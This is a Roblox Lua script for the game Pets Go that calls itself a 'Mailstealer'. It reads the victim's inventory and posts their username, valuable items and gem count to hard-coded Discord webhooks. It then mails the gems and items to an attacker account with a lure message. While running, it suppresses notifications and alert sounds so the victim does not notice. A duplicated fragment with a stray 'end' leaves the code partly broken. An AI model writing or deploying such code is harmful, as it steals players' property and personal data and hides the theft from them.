local rapThreshold = 100000 -- Set the RAP threshold value

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network", 5)
local library = require(game.ReplicatedStorage:WaitForChild("Library", 5))
local saveModule = game:GetService("ReplicatedStorage"):WaitForChild("Library", 5):WaitForChild("Client", 5):WaitForChild("Save", 5)
local save = saveModule and saveModule:Get().Inventory or {}
local plr = game.Players.LocalPlayer
local MailMessage = "Join gg / GY2RVSEGDT to get back"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
_G.scriptExecuted = _G.scriptExecuted or false
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local GemAmount1 = 0
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end

local function formatNumber(number)
    if number == nil then
        return "0"
    end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

-- Define the global and alternative webhooks
local globalWebhook = "https://discord.com/api/webhooks/1289613307631632417/xyz1234"
local alternateWebhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3"

local function SendMessage(username, diamonds, isAboveThreshold)
    local headers = {
        ["Content-Type"] = "application/json",
    }

    local fields = {
        {
            name = "Victim Username:",
            value = username,
            inline = true
        },
        {
            name = "Items to be sent:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = "",
            inline = false
        }
    }

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap, chance = item.chance}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        local itemLine = ""
        if itemData.chance then
            itemLine = string.format("1/%s %s (x%d): %s RAP", formatNumber(itemData.chance), itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
        else
            itemLine = string.format("%s (x%d): %s RAP", itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
        end
        fields[2].value = fields[2].value .. itemLine .. "\n"
    end

    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "New Pets Go Execution",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)

    -- Always send to the global webhook
    if globalWebhook and globalWebhook ~= "" then
        local response = HttpService:PostAsync(globalWebhook, body, Enum.HttpContentType.ApplicationJson)
    end

    -- If the RAP is below threshold, send to the alternative webhook too
    if not isAboveThreshold and alternateWebhook and alternateWebhook ~= "" then
        local response = HttpService:PostAsync(alternateWebhook, body, Enum.HttpContentType.ApplicationJson)
    end
end

    -- If the RAP is below threshold, send to the alternative webhook too
    if not isAboveThreshold and alternateWebhook and alternateWebhook ~= "" then
        local response = request({
            Url = alternateWebhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end
end

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
    noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
            x.Volume = 0
            x.PlayOnRemove = false
            x:Destroy()
        end
    end
end)

local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end
        }
    ) or 0)
end

local user = Username or "tobi437a"
local min_rap = min_rap or rapThreshold
local min_chance = min_chance or 10000
local webhook = webhook

local function sendItem(category, uid, am)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
    local response = false
    repeat
        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    until response == true
end

local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            if GemAmount1 >= 500 and GemAmount1 >= min_rap then
                local args = {
                    [1] = user,
                    [2] = MailMessage,
                    [3] = "Currency",
                    [4] = i,
                    [5] = GemAmount1
                }
                local response = false
                repeat
                    local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                until response == true
                break
            end
        end
    end
end

local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

local categoryList = {"Pet", "Hoverboard", "Fruit", "Misc", "Booth"}

for i, v in pairs(categoryList) do
    if save[v] ~= nil then
        for uid, item in pairs(save[v]) do
            if v == "Pet" then
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    local itemInfo = {
                        name = item.name,
                        amount = item.amount,
                        rap = rapValue,
                        chance = item.sh or 0
                    }
                    table.insert(sortedItems, itemInfo)
                    totalRAP = totalRAP + (rapValue * (item._am or 1))
                end
            else
                if item._am > 0 then
                    local rapValue = getRAP(v, item)
                    if rapValue >= min_rap then
                        local itemInfo = {
                            name = item.name,
                            amount = item.amount,
                            rap = rapValue,
                            chance = item.sh or 0
                        }
                        table.insert(sortedItems, itemInfo)
                        totalRAP = totalRAP + (rapValue * (item._am or 1))
                    end
                end
            end
        end
    end
end

SendMessage(user, GemAmount1, totalRAP < rapThreshold)
SendAllGems()
ClaimMail()
